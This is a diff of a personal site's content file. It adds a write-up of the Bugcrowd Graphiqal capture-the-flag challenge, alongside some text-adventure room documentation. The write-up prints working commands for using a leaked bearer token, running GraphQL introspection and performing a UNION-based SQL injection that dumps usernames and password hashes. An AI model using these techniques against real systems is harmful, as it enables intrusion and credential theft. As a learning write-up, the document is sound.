@@ -483,7 +483,8 @@ _ Last updated: 2021.03.31
 & You can create your own rooms by placing files in the [b:~/.world/rooms] directory.
 & The files are named for their coordinates in the format [b:x_y]. Negative coordinates use an "n" instead of "-". So a room at coordinate [b:-1 0] would be a file named [b:n1_0].
 & A basic room looks like this:
-! <pre>NAME : Landing room<br>DESC : An ordinary room</pre>
+% NAME : Landing room
+% DESC : An ordinary room
 & Rooms have the following properties available:
 - [c:NAME] - The name of the room
 - [c:DESC] - A description of the room. This is displayed with the [b:look] command
@@ -491,7 +492,19 @@ _ Last updated: 2021.03.31
 - [c:TELEPORT] - Optional. x,y coordinates to redirect the user to if they teleport here (such as the start of a dungeon).
 2 Objects
 & A room can contain multiple objects. A room with objects would look like this:
-! <pre>NAME : Landing room<br>DESC : An ordinary room<br>OBJECTS<br>  -<br>    ID : sword<br>    NAME : wooden sword<br>    GRAB : true<br>    DESC : A wooden sword in good condition<br>  -<br>    ID : shield<br>    NAME : wooden shield<br>    GRAB : true<br>    DESC : A wooden shield in good condition</pre>
+% NAME : Landing room
+% DESC : An ordinary room
+% OBJECTS
+%   -
+%    ID : sword
+%    NAME : wooden sword
+%    GRAB : true
+%    DESC : A wooden sword in good condition
+%  -
+%    ID : shield
+%    NAME : wooden shield
+%    GRAB : true
+%    DESC : A wooden shield in good condition
 & Objects have the following properties available:
 - [c:ID] - A unique identifier for referencing the object
 - [c:NAME] - The name of the object
@@ -505,7 +518,22 @@ _ Last updated: 2021.03.31
 & Props are key/value pairs. They will be stored in a file specific to the room/prop and the user. That means that whatever state a room and it's objects are in for one user does not affect it for another user.
 & Actions are a list of triggers and a list of instructions.
 & Here is an object with a prop and an action:
-! <pre>  -<br>    ID : lamp<br>    NAME : ordinary lamp<br>    GRAB : false<br>    DESC : A lamp with a switch. It is currently [power].<br>    PROPS<br>      power=off<br>    ACTIONS<br>      turn|switch|push|pull<br>        IF power=on<br>        SET power=off<br>        ECHO You turn off the lamp<br>        ELSE<br>        SET power=on<br>        ECHO You turn on the lamp<br>        ENDIF</pre>
+%   -
+%    ID : lamp
+%    NAME : ordinary lamp
+%    GRAB : false
+%    DESC : A lamp with a switch. It is currently [power].
+%    PROPS
+%      power=off
+%    ACTIONS
+%      turn|switch|push|pull
+%        IF power=on
+%        SET power=off
+%        ECHO You turn off the lamp
+%        ELSE
+%        SET power=on
+%        ECHO You turn on the lamp
+%        ENDIF
 & When the user runs [b:turn lamp] it will either turn the power prop on or off depending on if it is currently set to on or off.
 2 Action instructions
 & Actions currently support the following:
@@ -743,3 +771,203 @@ _ 2020.12.31
 - Be [b:less strict] with myself and others
 - Take the time to [b:paint/sketch] more
 - Use my [b:phone] for [b:less than an hour a day]
+
+~writing/graphiqal : Bugcrowd Graphiqal CTF Write-up : 2020.07.21
+1 2020 Bugcrowd Graphiqal CTF Write-up
+_ 2020.07.21
+* [c:UPDATE 2021.04.13] It seems Bugcrowd has taken down this CTF, so the links will not work any longer. I will leave them as they were, as I don't have anything better to change them to.
+& I have been interested in [b:appsec] for a long time, but never really took the time to study it or to practice it. I have recently started focusing my time on it, and decided to try my hand at [l:https://bugcrowd.com|Bugcrowd]'s beginner CTF, [l:https://bgcd.co/GRAPHIQALCTF|Graphiqal].
+# [l:#Scoping out the landscape|Scoping out the landscape]
+# [l:#Flag #1|Flag #1]
+# [l:#Flag #2|Flag #2]
+# [l:#Flag #3|Flag #3]
+# [l:#Takeaways|Takeaways]
+2 Scoping out the landscape
+& The first thing I did was manually scope out the site, to see what was there. I found the following:
+- [b:API (/api)] - displays a message saying they moved to [b:graphql]
+- [b:Gogs (:3000)] - a [b:gogs] instance with some source code
+2 Flag #1
+& I manually browsed the source code in the repository, as there wasn't much. Eventually I found [l:http://164.90.156.83:3000/maxim/graphiqal-ant/commit/be4aa476e3241298408fa48d1b8216bd2c5b3fc4|this commit] which contained the first flag: [c:FLAG{9e233d7662f4fe8f0e6eaee08b1e1dd8}].
+& In hindsight I realized a more efficient use of my time would have been to download each of the repositories and run [c:ack "FLAG"] which also would have given me this flag.
+2 Flag #2
+& After finding that one fairly quickly I decided to take a look at [b:graphql] since it was mentioned on the [b:/api] page.
+& A common endpoint for graphql is [c:/graphql]. I made a request to that and received the following response:
+% $ http http://164.90.156.83/graphql
+% HTTP/1.1 401 Unauthorized
+% 
+% Missing Bearer Token
+& Since I needed a bearer token, I decided to search through the repositories again to see if I could find a secret I could use to generate a token. I then stumbled upon a [l:http://164.90.156.83:3000/maxim/new-painting-checker/src/master/retrieve.py|cleartext token]. Even better.
+& I made a request, passing the token as a header and got a response letting me know it worked:
+% $ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d"
+% HTTP/1.1 400 Bad Request
+% 
+% {
+%   "errors": [
+%     {
+%         "message": "Must provide query string."
+%     }
+%   ]
+% }
+& Since I was now able to make graphql requests, I searched for a query that I could use to get a list of all the available graphtypes. I found [l:https://stackoverflow.com/questions/37397886/get-graphql-whole-schema-query|this stackoverflow question] which provided an introspection query to get the schema information. After some trial and error I ended up with this request:
+% $ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d" "query=query IntrospectionQuery {__schema{queryType{name}types{name fields(includeDeprecated: true) { name description isDeprecated deprecationReason }}}}"
+% HTTP/1.1 200 OK
+% 
+% {
+%     "data": {
+%         "__schema": {
+%             "types": [
+%                 ...
+%                 {
+%                     "fields": [
+%                         {
+%                             "deprecationReason": null,
+%                             "description": null,
+%                             "isDeprecated": false,
+%                             "name": "id"
+%                         },
+%                         {
+%                             "deprecationReason": null,
+%                             "description": null,
+%                             "isDeprecated": false,
+%                             "name": "name"
+%                         },
+%                         {
+%                             "deprecationReason": null,
+%                             "description": null,
+%                             "isDeprecated": false,
+%                             "name": "artist"
+%                         },
+%                         {
+%                             "deprecationReason": null,
+%                             "description": null,
+%                             "isDeprecated": false,
+%                             "name": "genre"
+%                         },
+%                         {
+%                             "deprecationReason": null,
+%                             "description": null,
+%                             "isDeprecated": false,
+%                             "name": "price"
+%                         }
+%                     ],
+%                     "name": "Paintings"
+%                 },
+%             ...
+%           ]
+%           ...
+%         }
+%     }
+% }
+& It seemed the only graphtype I could use was [b:Paintings] so I made a request to fetch all of those:
+% $ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d" "query=query IntrospectionQuery {paintings{id name genre artist price}}"
+% HTTP/1.1 200 OK
+% 
+% {
+%     "data": {
+%         "paintings": [
+%             {
+%                 "artist": "Montgomery Butler",
+%                 "genre": "Contemporary",
+%                 "id": "1",
+%                 "name": "Harmony Sky",
+%                 "price": 27890.21
+%             },
+%             {
+%                 "artist": "Jem Salton",
+%                 "genre": "Realism",
+%                 "id": "2",
+%                 "name": "Night Paradise",
+%                 "price": 12783.99
+%             },
+%             {
+%                 "artist": "Gregory Mosley",
+%                 "genre": "Realism",
+%                 "id": "3",
+%                 "name": "Virtue of Cluster",
+%                 "price": 8821.98
+%             },
+%             {
+%                 "artist": "Zunairah Milner",
+%                 "genre": "Cubism",
+%                 "id": "4",
+%                 "name": "Cubex",
+%                 "price": 17829.42
+%             },
+%             {
+%                 "artist": "Kaelan Beck",
+%                 "genre": "Abstract",
+%                 "id": "5",
+%                 "name": "Relinquished Lifestyle",
+%                 "price": 13212.11
+%             },
+%             {
+%                 "artist": "FLAG{b5c009704caf8d0575cbc801a97ae49b}",
+%                 "genre": "Realism",
+%                 "id": "6",
+%                 "name": "Drapeau",
+%                 "price": 1337.37
+%             },
+%             {
+%                 "artist": "Hadi Mene",
+%                 "genre": "Realism",
+%                 "id": "7",
+%                 "name": "Labs of the Wizard",
+%                 "price": 76213.81
+%             },
+%             {
+%                 "artist": "Samiha Schofield",
+%                 "genre": "GFX",
+%                 "id": "8",
+%                 "name": "Wound of Philosophy",
+%                 "price": 14273.22
+%             },
+%             {
+%                 "artist": "Ernest Benton",
+%                 "genre": "Abstract",
+%                 "id": "9",
+%                 "name": "Majestueuse Sky",
+%                 "price": 100000.47
+%             },
+%             {
+%                 "artist": "Roxie Bannister",
+%                 "genre": "Cubism",
+%                 "id": "10",
+%                 "name": "Arrive Abandonn",
+%                 "price": 3200000.38
+%             }
+%         ]
+%     }
+% }
+& And there we have it, flag #2: [c:FLAG{b5c009704caf8d0575cbc801a97ae49b}]
+2 Flag #3
+& This one gave me a lot of troubles. I didn't know where to start, as I had exhausted all of the ideas I had from my initial investigation of the landscape. I poked around more in the repositories trying to find any sort of credentials I could use. There were some local SQL credentials, however port 3306 was not open on the server.
+& I had no idea how much more difficult this flag would be, and ended up going down the wrong path. I had decided there may be a documented vulnerability with the version of gogs they were running. I tried many different POCs for vulnerabilities related to gogs, all with no luck. I even tried using a script called [l:https://github.com/TheZ3ro/gogsownz|gogsownz]. Nothing was working.
+& I was certain I was on the right track, because there was a reference to a file in the repo: [c:/tmp/testing/pwned777.txt], I figured I needed to use a [b:Path Traversal] attack to find out what was in that file.
+& After a lot of effort I went into the [l:https://discord.com/invite/TWr3Brs|Bugcrowd Discord] and asked how much more difficult the third flag was from the second. While looking in there I also noticed someone said there wasn't any vulnerable software, as far as they knew, so that would indicate that this was the wrong path to be going down.
+& There was then a hint posted
+> [b:mqt:] think of from where the API is pulling the data and what vulnerabilities can arise from this
+& I was then thinking about how I saw those SQL credentials, and how graphql would use some sort of database technology. I then started researching how to do [b:SQL Injection] via [b:graphql] queries. It turned out that I could use the [b:painting] request where you pass an ID to get a single painting, and inject some SQL into it. This ended up working, and after some playing around I came up with this query:
+% $ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d" "query=query IntrospectionQuery {painting(id:\"' UNION SELECT id, GROUP_CONCAT(password),GROUP_CONCAT(username),null,null FROM users #\"){id name artist}}"
+% HTTP/1.1 200 OK
+% 
+% {
+%     "data": {
+%         "painting": {
+%             "artist": "maxim,hadi,FLAG",
+%             "id": "1",
+%             "name": "29d79648ac14a5d8d0268867bd3161c6,bc8a5e6ccfb6c15b61d6d218c2df6cca,FLAG{2f55138f7dce2e3e852f1c8a487b33f9}"
+%         }
+%     }
+% }
+& There it was, the third flag as a password of the user FLAG: [c:FLAG{2f55138f7dce2e3e852f1c8a487b33f9]
+2 Takeaways
+& This CTF provided multiple attack vectors that should be considered when writing software:
+3 Flag 1
+- Don't leave sensitive information in git repositories
+3 Flag 2
+- Don't leave secrets or tokens in git repositories
+- Don't allow introspection queries in graphql
+3 Flag 3
+- Sanitize your inputs to prevent SQL injection
+2 Final notes
+& While I started going in the wrong direction, and I ended up using a hint, overall I consider this a success and I had a ton of fun participating. I'm going to continue to try my hand at other challenges. Thanks for reading!
